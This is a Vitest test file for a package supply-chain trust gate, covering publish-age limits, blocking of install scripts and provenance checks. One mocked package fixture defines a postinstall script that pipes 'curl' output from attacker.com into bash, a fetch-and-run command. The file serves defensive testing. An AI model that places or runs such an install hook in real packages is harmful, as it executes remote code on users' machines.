import { describe, expect, it, vi } from "vitest";
import { verifyPackageTrust } from "./supply-chain.js";

const mocked = vi.hoisted(() => ({
  httpClient: vi.fn(),
}));

vi.mock("./http-client.js", () => ({
  httpClient: mocked.httpClient,
}));

describe("supply-chain verification gate", () => {
  it("returns trusted: true when no supply chain policy is configured", async () => {
    const verdict = await verifyPackageTrust("lodash", "4.17.21");
    expect(verdict.trusted).toBe(true);
  });

  it("blocks releases younger than minPublishAgeHours", async () => {
    // 2 hours ago
    const twoHoursAgo = new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString();
    mocked.httpClient.mockResolvedValueOnce({
      ok: true,
      status: 200,
      data: {
        name: "foo",
        time: { "1.0.1": twoHoursAgo },
        versions: { "1.0.1": { name: "foo", version: "1.0.1" } },
      },
    });

    const verdict = await verifyPackageTrust("foo", "1.0.1", { minPublishAgeHours: 48 });
    expect(verdict.trusted).toBe(false);
    expect(verdict.reason).toContain("published only");
  });

  it("blocks releases with install scripts when blockInstallScripts is true", async () => {
    const oneWeekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
    mocked.httpClient.mockResolvedValueOnce({
      ok: true,
      status: 200,
      data: {
        name: "malicious-pkg",
        time: { "2.0.0": oneWeekAgo },
        versions: {
          "2.0.0": {
            name: "malicious-pkg",
            version: "2.0.0",
            scripts: { postinstall: "curl -s http://attacker.com | bash" },
          },
        },
      },
    });

    const verdict = await verifyPackageTrust("malicious-pkg", "2.0.0", {
      blockInstallScripts: true,
    });
    expect(verdict.trusted).toBe(false);
    expect(verdict.reason).toContain("defines risky lifecycle scripts (postinstall)");
  });

  it("blocks releases without provenance when requireProvenance is true", async () => {
    const oneWeekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
    mocked.httpClient.mockResolvedValueOnce({
      ok: true,
      status: 200,
      data: {
        name: "unattested-pkg",
        time: { "2.0.0": oneWeekAgo },
        versions: {
          "2.0.0": {
            name: "unattested-pkg",
            version: "2.0.0",
            dist: {},
          },
        },
      },
    });

    const verdict = await verifyPackageTrust("unattested-pkg", "2.0.0", {
      requireProvenance: true,
    });
    expect(verdict.trusted).toBe(false);
    expect(verdict.reason).toContain("cryptographic build provenance");
  });

  it("allows releases that satisfy all supply chain criteria", async () => {
    const oneWeekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
    mocked.httpClient.mockResolvedValueOnce({
      ok: true,
      status: 200,
      data: {
        name: "good-pkg",
        time: { "3.0.0": oneWeekAgo },
        versions: {
          "3.0.0": {
            name: "good-pkg",
            version: "3.0.0",
            dist: {
              attestations: {
                provenance: { predicateType: "https://slsa.dev/provenance/v1" },
              },
            },
          },
        },
      },
    });

    const verdict = await verifyPackageTrust("good-pkg", "3.0.0", {
      minPublishAgeHours: 48,
      blockInstallScripts: true,
      requireProvenance: true,
    });
    expect(verdict.trusted).toBe(true);
  });
});
